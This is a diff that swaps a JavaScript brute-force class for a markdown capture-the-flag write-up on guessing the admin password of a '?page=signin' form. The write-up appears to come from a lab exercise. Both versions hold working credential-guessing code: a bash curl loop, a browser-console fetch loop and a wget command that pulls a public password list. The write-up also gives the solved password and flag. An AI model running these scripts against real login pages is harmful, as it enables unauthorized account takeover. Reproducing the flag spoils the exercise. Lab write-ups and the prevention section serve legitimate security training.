@@ -1,234 +1,169 @@
-/**
- * Streamlined Brute Force Script
- * Shows each tested password with minimal overhead
- */
+# Brute Force Authentication Vulnerability
 
-class StreamlinedBruteForce {
-  constructor() {
-    // Current timestamp
-    this.timestamp = '2025-04-22 20:12:19';
-    
-    // Target information
-    this.baseUrl = window.location.origin || 'http://192.168.247.84';
-    this.endpoint = '/index.php?page=signin';
-    this.username = 'admin';
-    
-    // Password list source
-    this.passwordListUrl = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt';
-    
-    // Known indicator for failed login
-    this.failureIndicator = 'WrongAnswer.gif';
-    
-    // Common passwords to try first
-    this.priorityPasswords = [
-      //'shadow',  // Known correct password
-      'admin', 'password', '123456', 'qwerty', 
-      'letmein', 'welcome', 'admin123'
-    ];
-    
-    // Tracking
-    this.attempts = 0;
-    this.startTime = null;
-    this.passwordList = [];
-    this.allPasswords = [];
-    
-    // Results
-    this.correctPassword = null;
-    this.discoveredFlag = null;
-  }
-  
-  // Simple logging with timestamp and password being tested
-  log(password, success = false) {
-    const elapsed = this.startTime ? Math.floor((Date.now() - this.startTime) / 1000) : 0;
-    const status = success ? '✅' : '❌';
-    console.log(`[${this.timestamp}] ${status} Testing: "${password}" (${this.attempts})`);
-  }
-  
-  // Log success with highlight
-  logSuccess(message) {
-    console.log(`%c[${this.timestamp}] ✅ ${message}`, 'color: green; font-weight: bold');
-  }
-  
-  // Fetch password list
-  async fetchPasswordList() {
-    console.log(`[${this.timestamp}] Fetching password list...`);
-    
-    try {
-      const response = await fetch(this.passwordListUrl);
-      
-      if (!response.ok) {
-        throw new Error(`Failed to fetch: ${response.status}`);
-      }
-      
-      const text = await response.text();
-      this.passwordList = text.split('\n')
-        .map(pwd => pwd.trim())
-        .filter(pwd => pwd.length > 0);
-      
-      console.log(`[${this.timestamp}] Fetched ${this.passwordList.length} passwords`);
-      
-      // Create full list with priority passwords first
-      const uniquePasswords = new Set([
-        ...this.priorityPasswords, 
-        ...this.passwordList.filter(pwd => !this.priorityPasswords.includes(pwd))
-      ]);
-      
-      this.allPasswords = [...uniquePasswords];
-      
-      return true;
-    } catch (error) {
-      console.log(`[${this.timestamp}] Error fetching passwords: ${error.message}`);
-      this.allPasswords = [...this.priorityPasswords];
-      return false;
-    }
-  }
-  
-  // Format login URL
-  formatLoginUrl(password) {
-    return `${this.baseUrl}${this.endpoint}&username=${
-      encodeURIComponent(this.username)}&password=${
-      encodeURIComponent(password)}&Login=Login`;
-  }
-  
-  // Extract flag from HTML
-  extractFlag(html) {
-    const flagMatch = html.match(/<h2[^>]*>The flag is : ([a-f0-9]+)<\/h2>/i);
-    if (flagMatch && flagMatch[1]) {
-      return flagMatch[1];
-    }
-    
-    const hexMatch = html.match(/\b([a-f0-9]{32,64})\b/i);
-    if (hexMatch && hexMatch[1]) {
-      return hexMatch[1];
-    }
-    
-    return null;
-  }
-  
-  // Try a single password
-  async tryPassword(password) {
-    this.attempts++;
-    
-    try {
-      const url = this.formatLoginUrl(password);
-      
-      // Log every password attempt
-      this.log(password);
-      
-      const response = await fetch(url);
-      const html = await response.text();
-      
-      // Check for success
-      if (!html.includes(this.failureIndicator)) {
-        this.logSuccess(`SUCCESS! Password found: "${password}"`);
-        this.correctPassword = password;
-        
-        // Extract flag
-        const flag = this.extractFlag(html);
-        if (flag) {
-          this.discoveredFlag = flag;
-          this.logSuccess(`FLAG DISCOVERED: ${flag}`);
-          this.displayFlagBox(flag);
-        }
-        
-        return {success: true, html};
-      }
-      
-      return {success: false};
-    } catch (error) {
-      console.log(`[${this.timestamp}] ⚠️ Error testing "${password}": ${error.message}`);
-      return {success: false, error: true};
-    }
-  }
-  
-  // Display flag in a box
-  displayFlagBox(flag) {
-    console.log(`
-    ┌───────────────────────────────────────────────────┐
-    │                                                   │
-    │  🚩 FLAG: ${flag}  │
-    │                                                   │
-    └───────────────────────────────────────────────────┘
-    `);
-  }
-  
-  // Main execution method
-  async execute() {
-    console.log(`[${this.timestamp}] Starting brute force on ${this.baseUrl}`);
-    console.log(`[${this.timestamp}] Target username: ${this.username}`);
-    
-    // Fetch password list
-    await this.fetchPasswordList();
-    
-    this.startTime = Date.now();
-    
-    // Process passwords at maximum speed
-    for (const password of this.allPasswords) {
-      // Try the password
-      const result = await this.tryPassword(password);
-      
-      // Break on success
-      if (result.success) {
-        break;
-      }
-    }
-    
-    // Final report
-    const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
-    const elapsedStr = elapsed < 60 ? 
-      `${elapsed} seconds` : 
-      `${Math.floor(elapsed / 60)} minutes, ${elapsed % 60} seconds`;
-    
-    if (this.correctPassword) {
-      console.log(`
-      ===== BRUTE FORCE SUCCESSFUL =====
-      • Target: ${this.baseUrl}
-      • Username: ${this.username}
-      • Password: ${this.correctPassword}
-      • Flag: ${this.discoveredFlag || 'Not found'}
-      • Attempts: ${this.attempts}
-      • Time taken: ${elapsedStr}
-      ===============================
-      `);
-      
-      return {
-        success: true,
-        password: this.correctPassword,
-        flag: this.discoveredFlag,
-        attempts: this.attempts
-      };
-    } else {
-      console.log(`
-      ===== BRUTE FORCE INCOMPLETE =====
-      • Target: ${this.baseUrl}
-      • Username: ${this.username}
-      • Attempts: ${this.attempts}
-      • Time taken: ${elapsedStr}
-      • Status: No valid password found
-      ===============================
-      `);
-      
-      return {
-        success: false,
-        attempts: this.attempts
-      };
-    }
-  }
-}
+## Overview
+The login form at `/?page=signin` is vulnerable to brute force attacks, allowing attackers to guess admin credentials with no rate limiting.
 
-// Create and execute
-const bruteForce = new StreamlinedBruteForce();
+---
 
-// Start and store results for reference
-window.bruteForceResult = bruteForce.execute().then(result => {
-  console.log('Brute force completed!');
-  return result;
-});
+## How It Works
 
-// Direct password test utility
-window.testPassword = async (password) => {
-  const tester = new StreamlinedBruteForce();
-  return await tester.tryPassword(password);
-};
+1. **Finding the Target:**  
+   In a previous breach, we gained access to the members page, which revealed that "admin" is a valid username.
+2. **Attack:**  
+   Login requests are sent like this:
+   ```
+   /?page=signin&username=admin&password=<PASSWORD>&Login=Login
+   ```
+   A failed login shows "WrongAnswer.gif".
 
-console.log('Brute force attack started! Showing all password attempts...');
+---
+
+## Exploitation Methods
+
+### **Method 1: Bash Script with Password List**
+
+- Download a password list from GitHub:
+  ```bash
+  wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -O pwdlist.txt
+  ```
+- Use this brute force loop:
+  ```bash
+  for pwd in $(cat pwdlist.txt); do
+    resp=$(curl -s "http://<IP_ADDRESS>/?page=signin&username=admin&password=$pwd&Login=Login")
+    if [[ "$resp" == *"The flag is :"* ]]; then
+      flag=$(echo "$resp" | awk -F 'The flag is :' '{print $2}' | head -n1 | cut -c2-65)
+      echo "Success! Username: admin | Password: $pwd | Flag: $flag"
+      break
+    fi
+  done
+  ```
+- Password `shadow` is found to work.
+
+---
+
+### **Method 2: JavaScript in Google Chrome Console**
+
+1. Open the login page in Chrome.
+2. Open Developer Tools (F12), go to the **Console** tab.
+3. Paste and run this script (it fetches the same password list from GitHub and tries each password for you):
+
+   ```javascript
+   // URL to password list on GitHub
+   const passwordListUrl = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt';
+
+   // Format current time
+   const getCurrentTime = () => {
+     const now = new Date();
+     return now.toISOString().split('T')[0] + ' ' + now.toTimeString().split(' ')[0];
+   };
+
+   // Try a single password
+   async function tryPassword(password) {
+     try {
+       const timestamp = getCurrentTime();
+       console.log(`[${timestamp}] Testing: "${password}"`);
+       
+       const url = `index.php?page=signin&username=admin&password=${encodeURIComponent(password)}&Login=Login`;
+       const response = await fetch(url);
+       const html = await response.text();
+       
+       // Check for login success (no error image)
+       if (!html.includes('WrongAnswer.gif')) {
+         // Extract flag if present
+         const flagMatch = html.match(/The flag is : ([a-f0-9]+)/i);
+         const flag = flagMatch ? flagMatch[1] : 'Not found';
+         
+         console.log(`✅ SUCCESS! Password: "${password}", Flag: ${flag}`);
+         
+         // Display flag in a box
+         console.log(`
+   ┌${'─'.repeat(flag.length + 10)}┐
+   │  🚩 FLAG: ${flag}  │
+   └${'─'.repeat(flag.length + 10)}┘
+         `);
+         
+         return true;
+       }
+       return false;
+     } catch (error) {
+       console.log(`⚠️ Error with "${password}": ${error.message}`);
+       return false;
+     }
+   }
+
+   // Fetch passwords from GitHub
+   async function fetchPasswords() {
+     try {
+       console.log(`Fetching passwords from GitHub...`);
+       const response = await fetch(passwordListUrl);
+       
+       if (!response.ok) {
+         throw new Error(`Failed to fetch: ${response.status}`);
+       }
+       
+       const text = await response.text();
+       const passwords = text.split('\n')
+         .map(pwd => pwd.trim())
+         .filter(pwd => pwd.length > 0);
+       
+       console.log(`Fetched ${passwords.length} passwords`);
+       return passwords;
+     } catch (error) {
+       console.log(`Error fetching passwords: ${error.message}`);
+       // Fallback to some basic passwords if GitHub fetch fails
+       return ['admin', 'password', '123456', 'shadow', 'root'];
+     }
+   }
+
+   // Test all passwords with small delay
+   async function bruteForce() {
+     console.log(`Starting brute force attack at ${getCurrentTime()}...`);
+     
+     // Get passwords from GitHub
+     const passwords = await fetchPasswords();
+     
+     for (const password of passwords) {
+       // Add small delay to avoid overwhelming server
+       await new Promise(resolve => setTimeout(resolve, 30));
+       
+       // Stop if successful
+       if (await tryPassword(password)) {
+         break;
+       }
+     }
+     
+     console.log(`Brute force completed at ${getCurrentTime()}`);
+   }
+
+   // Start the brute force
+   bruteForce();
+
+   // Utility to test individual passwords
+   window.testPassword = (password) => tryPassword(password);
+   ```
+
+---
+
+## Result
+
+- **Username:** admin  
+- **Password:** shadow  
+- **Flag:** `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`
+
+---
+
+## Prevention
+
+1. **Account Lockout:** Temporarily disable accounts after multiple failures.
+2. **Strong Password Policy:** Require complex, non-common passwords.
+3. **MFA:** Add Multi-Factor Authentication for all users.
+4. **CAPTCHA:** Use CAPTCHA after failed logins.
+5. **Rate Limit:** Restrict login attempts per IP.
+6. **Monitoring:** Alert on brute force patterns.
+
+---
+
+## Resources
+
+- Password list source:  
+  [https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt)
